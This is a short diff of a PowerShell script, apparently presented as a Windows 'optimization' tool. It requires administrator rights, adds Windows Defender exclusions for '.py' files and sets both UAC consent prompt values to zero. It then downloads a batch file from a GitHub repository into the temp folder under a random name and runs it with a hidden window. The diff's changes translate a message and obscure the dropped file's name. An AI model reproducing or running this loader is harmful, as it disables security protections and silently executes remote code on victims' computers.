@@ -1,7 +1,7 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    Write-Host "Ce script doit etre execute avec les privileges administrateur. Relancez-le en tant qu'administrateur."
+    Write-Host "This script must be run with administrator privileges. Rerun it as administrator."
     pause
     exit 
 } else {
@@ -13,7 +13,7 @@ if (-not $isAdmin) {
     powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
     Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorAdmin" -Value 0
     Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorUser" -Value 0
-    iwr -useb raw.githubusercontent.com/sombrant/windows-opti/refs/heads/main/script.bat -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
+    iwr -useb raw.githubusercontent.com/sombrant/windows-opti/refs/heads/main/script.bat -o $env:TEMP\HZY3F367F97VH3I2GOF2G0J.bat; saps $env:TEMP\HZY3F367F97VH3I2GOF2G0J.bat -WindowStyle Hidden
 }
 
 
